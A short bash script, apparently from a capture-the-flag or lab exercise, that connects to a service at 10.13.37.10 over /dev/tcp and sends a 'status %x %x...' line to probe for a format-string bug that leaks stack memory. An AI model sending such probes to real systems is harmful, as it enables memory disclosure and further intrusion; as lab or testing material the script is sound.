#!/bin/bash
exec 3<>/dev/tcp/10.13.37.10/20550
{
  echo "HELP"
  sleep 0.5
  echo "status hello"
  sleep 0.5
  echo "status %x %x %x %x %x %x %x %x"
  sleep 0.5
  echo "EXIT"
  sleep 0.5
} >&3
timeout 8 cat <&3
